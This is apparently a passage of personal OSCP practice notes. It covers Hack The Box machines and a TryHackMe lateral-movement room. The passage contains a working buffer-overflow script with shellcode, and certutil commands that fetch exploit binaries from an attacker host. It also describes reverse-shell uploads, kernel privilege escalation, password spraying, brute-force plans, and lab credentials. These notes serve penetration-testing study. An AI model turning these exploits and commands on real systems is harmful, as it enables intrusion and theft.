b\"\\x66\\x42\\x33\\x72\\x36\\x52\\x48\\x50\\x79\\x46\\x6c\\x4d\\x6f\"                                                                                                               buf += b\"\\x52\\x66\\x79\\x6f\\x49\\x45\\x73\\x59\\x67\\x70\\x4e\\x6e\\x62\"                                                                                                               buf += b\"\\x36\\x4f\\x56\\x79\\x6f\\x4c\\x70\\x62\\x48\\x4b\\x58\\x62\\x67\"                                                                                                               buf += b\"\\x4d\\x4d\\x63\\x30\\x69\\x6f\\x37\\x65\\x75\\x6b\\x68\\x70\\x56\"                                                                                                               buf += b\"\\x55\\x33\\x72\\x62\\x36\\x51\\x58\\x63\\x76\\x33\\x65\\x37\\x4d\"                                                                                                               buf += b\"\\x45\\x4d\\x59\\x6f\\x58\\x55\\x4d\\x6c\\x4a\\x66\\x43\\x4c\\x5a\"                                                                                                               buf += b\"\\x6a\\x73\\x50\\x6b\\x4b\\x37\\x70\\x33\\x45\\x59\\x75\\x35\\x6b\"                                                                                                               buf += b\"\\x71\\x37\\x4e\\x33\\x30\\x72\\x62\\x4f\\x6f\\x7a\\x6b\\x50\\x6e\"                                                                                                               buf += b\"\\x73\\x39\\x6f\\x36\\x75\\x41\\x41\"                                                                                                                                                                                                                                                                                                                    # Create a UDP socket                                                                                                                                                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)                                                                                                                      server_address = ('10.10.10.74', 9256)                                                                                                                                                                                                                                                                                                                    fs = \"\\x55\\x2A\\x55\\x6E\\x58\\x6E\\x05\\x14\\x11\\x6E\\x2D\\x13\\x11\\x6E\\x50\\x6E\\x58\\x43\\x59\\x39\"                                                                                      p  = \"A0000000002#Main\" + \"\\x00\" + \"Z\"*114688 + \"\\x00\" + \"A\"*10 + \"\\x00\"                                                                                                     p += \"A0000000002#Main\" + \"\\x00\" + \"A\"*57288 + \"AAAAASI\"*50 + \"A\"*(3750-46)                                                                                                  p += \"\\x62\" + \"A\"*45                                                                                                                                                         p += \"\\x61\\x40\"                                                                                                                                                              p += \"\\x2A\\x46\"                                                                                                                                                              p += \"\\x43\\x55\\x6E\\x58\\x6E\\x2A\\x2A\\x05\\x14\\x11\\x43\\x2d\\x13\\x11\\x43\\x50\\x43\\x5D\" + \"C\"*9 + \"\\x60\\x43\"                                                                         p += \"\\x61\\x43\" + \"\\x2A\\x46\"                                                                                                                                                 p += \"\\x2A\" + fs + \"C\" * (157-len(fs)- 31-3)                                                                                                                                 p += buf + \"A\" * (1152 - len(buf))                                                                                                                                           p += \"\\x00\" + \"A\"*10 + \"\\x00\"                                                                                                                                                                                                                                                                                                                             print \"----&gt;{P00F}!\"                                                                                                                                                         i=0                                                                                                                                                                          while i&lt;len(p):                                                                                                                                                                  if i &gt; 172000:                                                                                                                                                                   time.sleep(1.0)                                                                                                                                                          sent = sock.sendto(p[i:(i+8192)], server_address)                                                                                                                            i += sent                                                                                                                                                                sock.close() \n</code></pre> <p>Started a listener, then fired the exploit. </p> <p>My first point :) eeek.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/2.%20Chatterbox/#user-flag","title":"User Flag","text":"<p>SystemInfo</p> <pre><code>systeminfo\nHost Name:                 CHATTERBOX\nOS Name:                   Microsoft Windows 7 Professional\nOS Version:                6.1.7601 Service Pack 1 Build 7601\nOS Manufacturer:           Microsoft Corporation\nOS Configuration:          Standalone Workstation\nOS Build Type:             Multiprocessor Free\nRegistered Owner:          Windows User\nRegistered Organization:\nProduct ID:                00371-222-9819843-86663\nOriginal Install Date:     12/10/2017, 9:18:19 AM\nSystem Boot Time:          2/3/2022, 10:37:18 PM\nSystem Manufacturer:       VMware, Inc.\nSystem Model:              VMware Virtual Platform\nSystem Type:               X86-based PC\nProcessor(s):              2 Processor(s) Installed.\n                    [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz\n                    [02]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz\nBIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018\nWindows Directory:         C:\\Windows\nSystem Directory:          C:\\Windows\\system32\nBoot Device:               \\Device\\HarddiskVolume1\nSystem Locale:             en-us;English (United States)\nInput Locale:              en-us;English (United States)\nTime Zone:                 (UTC-05:00) Eastern Time (US &amp; Canada)\nTotal Physical Memory:     2,047 MB\nAvailable Physical Memory: 1,536 MB\nVirtual Memory: Max Size:  4,095 MB\nVirtual Memory: Available: 3,425 MB\nVirtual Memory: In Use:    670 MB\nPage File Location(s):     C:\\pagefile.sys\nDomain:                    WORKGROUP\nLogon Server:              \\\\CHATTERBOX\nHotfix(s):                 183 Hotfix(s) Installed.\nHotfix(s):                 183 Hotfix(s) Installed.\n                    [01]: KB2849697\n                    [02]: KB2849696\n                    [03]: KB2841134\n                    [04]: KB2670838\n                    [05]: KB2830477\n                    [06]: KB2592687\n                    [07]: KB2479943\n                    [08]: KB2491683\n                    [09]: KB2506212\n                    [10]: KB2506928\n                    [11]: KB2509553\n                    [12]: KB2533552\n                    [13]: KB2534111\n                    [14]: KB2545698\n                    [15]: KB2547666\n                    [16]: KB2552343\n                    [17]: KB2560656\n                    [18]: KB2563227\n                    [19]: KB2564958\n                    [20]: KB2574819\n                    [21]: KB2579686\n                    [22]: KB2604115\n                    [23]: KB2620704\n                    [24]: KB2621440\n                    [25]: KB2631813\n                    [26]: KB2639308\n                    [27]: KB2640148\n                    [28]: KB2647753\n                    [29]: KB2654428\n                    [30]: KB2660075\n                    [31]: KB2667402\n                    [32]: KB2676562\n                    [33]: KB2685811\n                    [34]: KB2685813\n                    [35]: KB2690533\n                    [36]: KB2698365\n                    [37]: KB2705219\n                    [38]: KB2719857\n                    [39]: KB2726535\n                    [40]: KB2727528\n                    [41]: KB2729094\n                    [42]: KB2732059\n                    [43]: KB2732487\n                    [44]: KB2736422\n                    [45]: KB2742599\n                    [46]: KB2750841\n                    [47]: KB2761217\n                    [48]: KB2763523\n                    [49]: KB2770660\n                    [50]: KB2773072\n                    [51]: KB2786081\n                    [52]: KB2799926\n                    [53]: KB2800095\n                    [54]: KB2807986\n                    [55]: KB2808679\n                    [56]: KB2813430\n                    [57]: KB2820331\n                    [58]: KB2834140\n                    [59]: KB2840631\n                    [60]: KB2843630\n                    [61]: KB2847927\n                    [62]: KB2852386\n                    [63]: KB2853952\n                    [64]: KB2857650\n                    [65]: KB2861698\n                    [66]: KB2862152\n                    [67]: KB2862330\n                    [68]: KB2862335\n                    [69]: KB2864202\n                    [70]: KB2868038\n                    [71]: KB2871997\n                    [72]: KB2884256\n                    [73]: KB2891804\n                    [74]: KB2892074\n                    [75]: KB2893294\n                    [76]: KB2893519\n                    [77]: KB2894844\n                    [78]: KB2900986\n                    [79]: KB2908783\n                    [80]: KB2911501\n                    [81]: KB2912390\n                    [82]: KB2918077\n                    [83]: KB2919469\n                    [84]: KB2923545\n                    [85]: KB2931356\n                    [86]: KB2937610\n                    [87]: KB2943357\n                    [88]: KB2952664\n                    [89]: KB2966583\n                    [90]: KB2968294\n                    [91]: KB2970228\n                    [92]: KB2972100\n                    [93]: KB2973112\n                    [94]: KB2973201\n                    [95]: KB2973351\n                    [96]: KB2977292\n                    [97]: KB2978742\n                    [98]: KB2984972\n                    [99]: KB2985461\n                    [100]: KB2991963\n                    [101]: KB2992611\n                    [102]: KB3003743\n                    [103]: KB3004361\n                    [104]: KB3004375\n                    [105]: KB3006121\n                    [106]: KB3006137\n                    [107]: KB3010788\n                    [108]: KB3011780\n                    [109]: KB3013531\n                    [110]: KB3020370\n                    [111]: KB3020388\n                    [112]: KB3021674\n                    [113]: KB3021917\n                    [114]: KB3022777\n                    [115]: KB3023215\n                    [116]: KB3030377\n                    [117]: KB3035126\n                    [118]: KB3037574\n                    [119]: KB3042058\n                    [120]: KB3045685\n                    [121]: KB3046017\n                    [122]: KB3046269\n                    [123]: KB3054476\n                    [124]: KB3055642\n                    [125]: KB3059317\n                    [126]: KB3060716\n                    [127]: KB3061518\n                    [128]: KB3067903\n                    [129]: KB3068708\n                    [130]: KB3071756\n                    [131]: KB3072305\n                    [132]: KB3074543\n                    [133]: KB3075226\n                    [134]: KB3078601\n                    [135]: KB3078667\n                    [136]: KB3080149\n                    [137]: KB3084135\n                    [138]: KB3086255\n                    [139]: KB3092627\n                    [140]: KB3093513\n                    [141]: KB3097989\n                    [142]: KB3101722\n                    [143]: KB3102429\n                    [144]: KB3107998\n                    [145]: KB3108371\n                    [146]: KB3108381\n                    [147]: KB3108664\n                    [148]: KB3109103\n                    [149]: KB3109560\n                    [150]: KB3110329\n                    [151]: KB3118401\n                    [152]: KB3122648\n                    [153]: KB3123479\n                    [154]: KB3126587\n                    [155]: KB3127220\n                    [156]: KB3133977\n                    [157]: KB3137061\n                    [158]: KB3138378\n                    [159]: KB3138612\n                    [160]: KB3138910\n                    [161]: KB3139398\n                    [162]: KB3139914\n                    [163]: KB3140245\n                    [164]: KB3147071\n                    [165]: KB3150220\n                    [166]: KB3150513\n                    [167]: KB3156016\n                    [168]: KB3156019\n                    [169]: KB3159398\n                    [170]: KB3161102\n                    [171]: KB3161949\n                    [172]: KB3161958\n                    [173]: KB3172605\n                    [174]: KB3177467\n                    [175]: KB3179573\n                    [176]: KB3184143\n                    [177]: KB3185319\n                    [178]: KB4014596\n                    [179]: KB4019990\n                    [180]: KB4040980\n                    [181]: KB976902\n                    [182]: KB982018\n                    [183]: KB4054518\nNetwork Card(s):           1 NIC(s) Installed.\n                    [01]: Intel(R) PRO/1000 MT Network Connection\nConnection Name: Local Area Connection\nDHCP Enabled:    No\nIP address(es)\n                    [01]: 10.10.10.74 \n</code></pre> <p>copy WinPEAS to target.</p> <pre><code>certutil.exe -urlcache -f http://10.10.16.4:80/winPEASx86.exe wp.exe\n</code></pre>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/2.%20Chatterbox/#winpeas-findings","title":"WinPEAS findings:","text":"<p>Nothing else really cool in WinPEAS - guess I should try exploit suggester. Here are the local, non-metasploit, exploits.</p> <pre><code>[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important\n    [*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC\n    [*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC\n    [*]\n[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important\n    [*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC\n</code></pre>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/2.%20Chatterbox/#privesc","title":"PrivEsc","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/2.%20Chatterbox/#ms16-075-rotten-potato","title":"MS16-075 - Rotten Potato","text":"<pre><code>certutil.exe -urlcache -f http://10.10.16.4:80/potato.exe potato.exe\n</code></pre> <p>Sleeping for 5 mins....I guess I'll wait for my SYSTEM shell...</p> <p>Shell never came back :( coming back to this later.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/3.%20Cronos/","title":"Cronos","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/3.%20Cronos/#recon","title":"Recon","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/3.%20Cronos/#port-scan","title":"Port Scan","text":"<pre><code>PORT   STATE SERVICE REASON         VERSION                                                                                                                                  22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)                                                                                                                                                 \n\n53/tcp open  domain  syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux)                                                                                                        | dns-nsid:                                                                                                                                                                  |_  bind.version: 9.10.3-P4-Ubuntu                                                                                                                                           \n\n80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))                                                                                                           | http-methods:                                                                                                                                                              |_  Supported Methods: POST OPTIONS GET HEAD                                                                                                                                 |_http-title: Apache2 Ubuntu Default Page: It works                                                                                                                          |_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                                                 \n\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                        OS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                                            \n\nAggressive OS guesses: Linux 3.10 - 4.11 (91%), Linux 3.12 (91%), Linux 3.13 (91%), Linux 3.13 or 4.2 (91%), Linux 3.16 (91%), Linux 3.16 - 4.6 (91%), Linux 3.18 (91%), Linux 3.2 - 4.9 (91%), Linux 3.8 - 3.11 (91%), Linux 4.2 (91%)  \n\n</code></pre>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/3.%20Cronos/#enumerate-the-attack-surface","title":"Enumerate the attack surface","text":"<p>This box is pretty basic looking. It appears to be running <code>Ubuntu</code>.</p> <p>Remote login - SSH (might be useful if I find a private key or gain credentials.)</p> <p>This box (<code>ns1</code>) appears to be an authoritive name server for the domain (<code>cronos.htb</code>). - DNS: bind 9.10.3-P4     - Zone xfer appears to have failed, maybe I need to be domain joined?</p> <p>This box also has a webserver: - Webserver: Apache 2.4.18     - <code>/index.html</code> Got a 200 status code for this homepage.     - Scan reveals Apache may be default configuration - this hasn't been set up yet.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/3.%20Cronos/#public-explotis","title":"Public Explotis","text":"<p>apache  bind </p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/3.%20Cronos/#exploitation","title":"Exploitation","text":"<p>Will be following HackTricks DNS guide</p> <p>Did a zone transfer! </p> <p>I added cronos to <code>/etc/hosts</code> and am able to see other sites now.</p> <p></p> <p>Going to rescan and take another break.</p> <p>Found some pages on the newly found site: </p> <p>Some more public exploits </p> <p>Added <code>admin.cronos.htb</code> to hosts.</p> <p></p> <p>Got in with some SQL injection  </p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/3.%20Cronos/#user-flag","title":"User Flag!","text":"<p><code>51d236438b333970dbba7dc3089be33b</code></p> <p></p> <p>uname -a</p> <p></p> <p>Getting shell Using PentestMonkey's reverse php webshell. </p> <p>Don't need this anymore, but I found it and thought it would be cool to include </p> <p>Uploaded webshell </p> <p>Start listener, and execute!</p> <p></p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/3.%20Cronos/#privesc","title":"PrivEsc","text":"<p>Found a few options for privesc on <code>linux kernel 4.4.0-72</code> This one ended up working EDB-44298</p> <p>Compiled on kali</p> <pre><code>gcc 44298.c -o pwn\n</code></pre> <p>Copy exploit and make executable.</p> <p></p> <p>Execute to get root</p> <p></p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/3.%20Cronos/#root-flag","title":"Root Flag","text":"<p><code>1703b8a3c9a8dde879942c79d02fd3a0</code> </p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/4.%20Forest/","title":"10.10.10.161","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/4.%20Forest/#recon","title":"Recon","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/4.%20Forest/#port-scan","title":"Port Scan","text":"<p>There were a lot of filtered ports included in the nmap results...I grepped for just the <code>open</code> ports to avoid the signal in the noise issue.</p> <pre><code>PORT      STATE    SERVICE      REASON          VERSION\n88/tcp    open     kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-02-03 16:58:07Z)                                                               135/tcp   open     msrpc        syn-ack ttl 127 Microsoft Windows RPC                                                                                                        139/tcp   open     netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn                                                                                                389/tcp   open     ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)                                   464/tcp   open     kpasswd5?    syn-ack ttl 127                                                                                                                              593/tcp   open     ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0                                                                                          636/tcp   open     tcpwrapped   syn-ack ttl 127                                                                                                                              3268/tcp  open     ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)                                   3269/tcp  open     tcpwrapped   syn-ack ttl 127                                                                                                                              5985/tcp  open     http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                      9389/tcp  open     mc-nmf       syn-ack ttl 127 .NET Message Framing                                                                                                         47001/tcp open     http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                      49664/tcp open     msrpc        syn-ack ttl 127 Microsoft Windows RPC                                                                                                        49665/tcp open     msrpc        syn-ack ttl 127 Microsoft Windows RPC                                                                                                        49666/tcp open     msrpc        syn-ack ttl 127 Microsoft Windows RPC                                                                                                        49667/tcp open     msrpc        syn-ack ttl 127 Microsoft Windows RPC                                                                                                        49671/tcp open     msrpc        syn-ack ttl 127 Microsoft Windows RPC                                                                                                        49676/tcp open     ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0                                                                                          49677/tcp open     msrpc        syn-ack ttl 127 Microsoft Windows RPC                                                                                                        49684/tcp open     msrpc        syn-ack ttl 127 Microsoft Windows RPC                                                                                                        49944/tcp open     msrpc        syn-ack ttl 127 Microsoft Windows RPC \n\n\nAggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%)\n</code></pre> <p>This one also appears to be an AD machine.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/4.%20Forest/#enumerate-attack-surface","title":"Enumerate attack surface","text":"<p>This one is also running Active Directory - 88: Kerberos - 389: ldap - 636: ldaps</p> <p>SMB? - 139: Netbios-ssn     - Anon login         - Nope - Various ports serving RPC</p> <p>Other - 464: kpasswd5?     - A service for changing LDAP passwords!? - 593: ncacn_http - RPC over HTTP 1.0 - 9389: mc-nmf - .NET Message Framing</p> <p>Web: - 5985: Microsoft HTTPAPI httpd 2.0     - WinRM? - check manual commands. - 47001: Microsoft HTTPAPI httpd 2.0</p> <p>Enum4linux did a great job on this one! Got a bunch of details about users. Here is a list of users with enabled accounts:</p> <ul> <li>All the <code>HealthMailbox</code> users</li> <li><code>lucinda</code></li> <li><code>Administrator</code></li> <li><code>sebastien</code></li> <li><code>santi</code></li> <li><code>svc-alfresco</code></li> <li><code>mark</code></li> <li><code>andy</code></li> </ul>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/4.%20Forest/#public-exploits","title":"Public exploits","text":"<p>Didn't find any.</p> <p>Maybe I can brute force the users</p> <pre><code>crackmapexec winrm 10.10.10.161 -d htb.local -u users.txt -p /usr/share/seclists/Passwords/darkweb2017-top100.txt\n</code></pre> <p>The domain is <code>htb.local</code></p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/5.%20Sauna/","title":"10.10.10.175","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/5.%20Sauna/#recon","title":"Recon","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/5.%20Sauna/#port-scan","title":"Port Scan","text":"<pre><code>PORT      STATE SERVICE       REASON          VERSION                                                                                                                        \n\n53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus                                                                                                                \n\n80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0                                                                                                       |_http-server-header: Microsoft-IIS/10.0                                                                                                                                     | http-methods:                                                                                                                                                              |   Supported Methods: OPTIONS TRACE GET HEAD POST                                                                                                                           |_  Potentially risky methods: TRACE                                                                                                                                         |_http-title: Egotistical Bank :: Home                                                                                                                                       \n\n88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-02-04 01:08:30Z)                                                                 \n\n135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                                 139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn                                                                                          389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)              445/tcp   open  microsoft-ds? syn-ack ttl 127                                                                                                                       464/tcp   open  kpasswd5?     syn-ack ttl 127                                                                                                                        593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0                                                                                    636/tcp   open  tcpwrapped    syn-ack ttl 127                                                                                                                        \n\n5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                                                        |_http-title: Not Found                                                                                                                                                      |_http-server-header: Microsoft-HTTPAPI/2.0                                                                                                                                  \n\n9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing                                                                                                           49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                                          49673/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0                                                                                            49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                                          49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                                          49689/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                                 49696/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC                                                                                                          \n\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                                        \n\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                                            \n\nNo OS matches for host\n\n</code></pre>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/5.%20Sauna/#enumerate-attack-surface","title":"Enumerate attack surface","text":"<p>This box also appears to be AD based domain controller.</p> <p>DNS     - 53: Simple DNS Plus</p> <p>Active Directory - 88: Kerberos - 389: LDAP - 636: LDAPs - 464: kpasswd5</p> <p>SMB - 139: netbios-ssn - 445: microsoft-ds - various RPC ports</p> <p>Webserver - 80: Microsoft IIS 10.0     - <code>Bootstrap 4.0.0</code></p> <pre><code>200      640l     1767w    30954c http://10.10.10.175/About.html                                                                                                             200      470l     1279w    24695c http://10.10.10.175/Blog.html                                                                                                              200      325l      770w    15634c http://10.10.10.175/Contact.html                                                                                                           301        2l       10w      150c http://10.10.10.175/Images                                                                                                                 200      683l     1813w    32797c http://10.10.10.175/Index.html                                                                                                             200      640l     1767w    30954c http://10.10.10.175/about.html                                                                                                             200      470l     1279w    24695c http://10.10.10.175/blog.html                                                                                                              200      325l      770w    15634c http://10.10.10.175/contact.html                                                                                                           301        2l       10w      147c http://10.10.10.175/css                                                                                                                    301        2l       10w      149c http://10.10.10.175/fonts                                                                                                                  301        2l       10w      150c http://10.10.10.175/images                                                                                                                 200      683l     1813w    32797c http://10.10.10.175/index.html                                                                                                             200      684l     1814w    38059c http://10.10.10.175/single.html\n\n</code></pre> <p>Others - 593: Microsoft RPC over HTTP 1.0 - 9389: .Net Message Framing - 5985: Microsoft HTTPAPI httpd 2.0     - WinRM? Check <code>_manual_commands.txt</code> - 49673: Microsoft RCP over HTTP 1.0</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/5.%20Sauna/#public-exploits","title":"Public Exploits","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/6.%20Sense/","title":"10.10.10.60","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/6.%20Sense/#recon","title":"Recon","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/6.%20Sense/#port-scan","title":"Port Scan","text":"<pre><code>PORT    STATE SERVICE  VERSION                                                                                                                                               80/tcp  open  http     lighttpd 1.4.35                                                                                                                                       443/tcp open  ssl/http lighttpd 1.4.35 \n\n</code></pre>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/6.%20Sense/#enumerate-attack-surface","title":"Enumerate attack surface","text":"<p>Webserver - 80: lighttpd 1.4.35 (http) - 443: lighttpd 1.4.35 (https)</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/6.%20Sense/#public-exploits","title":"Public exploits.","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/6.%20Sense/#a-closer-look-at-the-webserver","title":"A closer look at the webserver","text":"<p>pfSense? Is that you? </p> <p>Findings from the scan.</p> <pre><code>\u2514\u2500$ cat */*ferox* | grep -E '^200' | sort -u                                                                                                                                 200       10l       40w      271c https://10.10.10.60/changelog.txt                                                                                                          200      173l      425w        0c https://10.10.10.60/                                                                                                                       200      173l      425w        0c https://10.10.10.60/edit.php                                                                                                               200      173l      425w        0c https://10.10.10.60/exec.php                                                                                                               200      173l      425w        0c https://10.10.10.60/graph.php                                                                                                              200      173l      425w        0c https://10.10.10.60/help.php                                                                                                               200      173l      425w        0c https://10.10.10.60/index.php                                                                                                              200      173l      425w        0c https://10.10.10.60/interfaces.php                                                                                                         200      173l      425w        0c https://10.10.10.60/license.php                                                                                                            200      173l      425w        0c https://10.10.10.60/pkg.php                                                                                                                200      173l      425w        0c https://10.10.10.60/stats.php                                                                                                              200      173l      425w        0c https://10.10.10.60/status.php                                                                                                             200      173l      425w        0c https://10.10.10.60/system.php                                                                                                             200      173l      425w        0c https://10.10.10.60/wizard.php                                                                                                             200       17l       26w      384c https://10.10.10.60/xmlrpc.php                                                                                                             200       24l       32w      329c https://10.10.10.60/index.html                                                                                                             200        7l       24w     1406c https://10.10.10.60/favicon.ico \n</code></pre> <p>Most of those pages were behind a login page. I could only access - <code>changelog.txt</code> - which mentions a recent patch FAILED, only patches 2 of 3 vulnerabilities. </p> <ul> <li><code>xmlrpc.php</code> - which shows some XML error (probably because I'm doing a get request and it's expecting a POST with some command.)  Following HackTricks guide to xmlrpc I was able to get a list of valid commands. This can be used to brute-force creds if needed.</li> </ul> <p>Do a POST with this payload:</p> <pre><code>&lt;methodCall&gt;\n&lt;methodName&gt;system.listMethods&lt;/methodName&gt;\n&lt;params&gt;&lt;/params&gt;\n&lt;/methodCall&gt;\n</code></pre> <p></p> <p>While researching how to use pfsense's XMLRPC, I came across this exploit. The exploit requires credentials, but grants RCE. More about this weakness at NVD</p> <p>It looks like the exploit is using this XML payload to check the credential (only password I guess?).</p> <pre><code>&lt;?xml version='1.0' encoding='iso-8859-1'?&gt;\"\n&lt;methodCall&gt;\n&lt;methodName&gt;pfsense.host_firmware_version&lt;/methodName&gt;\n&lt;params&gt;\n&lt;param&gt;&lt;value&gt;&lt;string&gt;PASSWORD_HERE&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;\n&lt;/params&gt;\n&lt;/methodCall&gt;\n</code></pre> <p>So I will check this, and brute-force if possible.</p> <p></p> <p>Appears to be working! (Incorrect password)</p> <p></p> <p>Now for the brute-force.... Well, that was short lived. 75 requests worked, but now everything is timing out. In fact, it appears the whole webserver is down now. Wait....duh....my IP is probably deny-listed </p> <p>:'(</p> <p>Reverting...Will have to do something different for the brute-force attack. I could try the name of the box as the password...</p> <p>Also just noticed, lighttpd has some DOS vulnerability, apparently the requests are just going to quickly for it to handle. If I slow them down maybe my brute force will get past 80 requests :)</p> <ul> <li><code>index.html</code> - which has a link to install Dragon Fly BSD </li> </ul> <p>I crashed the damn thing again.... Moving to another box, may have to revert this when I come back - sort of jumped right in and skipped enumerating the attack surface, maybe take a step back when I come back to it.</p> <p>After reverting, and scouring the internet, the above screenshot seems to be tied to v 2.1.5 of pfsense.</p> <p>]</p> <p>After reviewing the exploits on here, I've come full circle. I'm back at the XMLRPC exploit, but I still need credentials. Maybe I can modify the python exploit to brute force as well.</p> <p>Downloading this exploit</p> <p>Split the file: lines 1-90 in <code>info.txt</code> and 91+ in <code>pfsense-rce.py</code></p> <p>This still isn't working.....maybe I can bypass the session thing on longin page using burp. I found some notes about using Intruder to update dynamic session values during a brute force, this may be the ticket.</p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/6.%20Sense/#identifying-changing-values","title":"Identifying changing values","text":""},{"location":"OSCP-Prep/OSCP%20practice%20exam/6.%20Sense/#reply-31","title":"Reply 31","text":"<p>set <code>cookie_test</code>  set <code>__csrf_magic</code> </p>"},{"location":"OSCP-Prep/OSCP%20practice%20exam/6.%20Sense/#request-32","title":"Request 32","text":"<p>updated <code>cookie_test</code>  updated<code>__csrf_magic</code>  is URL encoded</p> <p>Using Burp Intruder, with the following positions set, username is always <code>admin</code>:</p> <p></p> <p>Then set up Grep - Extract in Options to get around the session management: </p> <p>Now to set payloads:  Note: for payload 2, I've added <code>,</code> to the Payload Encoding char list.  </p> <p>For the wordlist, I've decided to use <code>rockyou.txt</code> - this has stalled burp while it loads</p> <p></p> <p>Trying to run this is causing my CPU to spike pretty heavily -  - </p> <p>Times up....</p>"},{"location":"OSCP-Prep/TryHackMe/AD%20Pivoting%20and%20Lateral%20Movement/","title":"Pivoting and lateral movement","text":"<pre><code>allan.wilkinson\n</code></pre> <pre><code>Xhlb3351\n</code></pre> <p>Lateral movement is bouncing between different hosts on the network. With each new host owned, more credentials and access may be available, which may lead to more boxes owned. This cycle of enumerating access on the network is called lateral movement and it is a cyclical process like port/service enumeration.</p> <p>It's important to know the difference between administrator types: - Local accounts in the local Administrator group     - Remote access is limited with medium level integrity token. (minus build in Administrator account) - Domain accounts in the local Administrators group</p>"},{"location":"OSCP-Prep/TryHackMe/AD%20Pivoting%20and%20Lateral%20Movement/#remote-commands","title":"Remote commands","text":""},{"location":"OSCP-Prep/TryHackMe/AD%20Pivoting%20and%20Lateral%20Movement/#psexec","title":"Psexec","text":"<ul> <li>Port 445</li> <li>Requires <code>Administrators</code> group membership</li> </ul> <pre><code>psexec64.exe \\\\MACHINE_IP -u Administrator -p Mypass123 -i 